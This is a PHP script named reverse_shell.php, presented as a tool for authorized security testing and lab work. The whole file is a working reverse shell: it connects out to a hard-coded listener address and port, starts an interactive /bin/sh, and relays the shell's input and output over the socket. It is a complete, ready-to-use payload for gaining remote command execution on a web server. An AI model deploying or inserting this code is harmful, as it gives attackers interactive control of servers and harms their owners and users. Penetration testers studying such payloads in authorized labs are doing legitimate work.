<?php
// =============================================================================
// Script Name:  reverse_shell.php
// Author:       Omegazyph
// Description:  Establishes an outbound TCP connection and spawns an interactive
//               shell for authorized security testing and lab environments.
// =============================================================================

// Set the target listener IP address and port number
$listener_ip = "192.168.1.50";
$listener_port = 4444;

// Suppress PHP warning output over the socket stream
set_time_limit(0);

// Create a TCP socket connection to the listener
$socket = fsockopen($listener_ip, $listener_port, $errno, $errstr, 30);

// Exit cleanly if the socket connection could not be established
if (!$socket) {
    exit("Connection failed: $errstr ($errno)\n");
}

// Define descriptor mappings for standard input, output, and error
$descriptors = array(
    0 => array("pipe", "r"), // stdin: commands received from the listener
    1 => array("pipe", "w"), // stdout: standard output sent back to listener
    2 => array("pipe", "w")  // stderr: error output sent back to listener
);

// Spawn a shell process attached to the pipes
$process = proc_open("/bin/sh -i", $descriptors, $pipes);

// Verify that the process was created successfully
if (!is_resource($process)) {
    fclose($socket);
    exit("Failed to spawn shell process.\n");
}

// Configure the socket and command pipes to non-blocking mode
stream_set_blocking($socket, false);
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);

// Loop while both the socket and the shell process remain active
while (!feof($socket) && !feof($pipes[1])) {
    // Read commands sent from the listener and write them to shell stdin
    $incoming = fread($socket, 2048);
    if ($incoming !== false && strlen($incoming) > 0) {
        fwrite($pipes[0], $incoming);
        fflush($pipes[0]);
    }

    // Read standard output from the shell and send it back over the socket
    $stdout_data = fread($pipes[1], 2048);
    if ($stdout_data !== false && strlen($stdout_data) > 0) {
        fwrite($socket, $stdout_data);
        fflush($socket);
    }

    // Read error output from the shell and send it back over the socket
    $stderr_data = fread($pipes[2], 2048);
    if ($stderr_data !== false && strlen($stderr_data) > 0) {
        fwrite($socket, $stderr_data);
        fflush($socket);
    }

    // Short sleep to avoid pegging CPU usage while polling streams
    usleep(50000);
}

// Close all open pipes, terminate the process, and close the socket
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
fclose($socket);
?>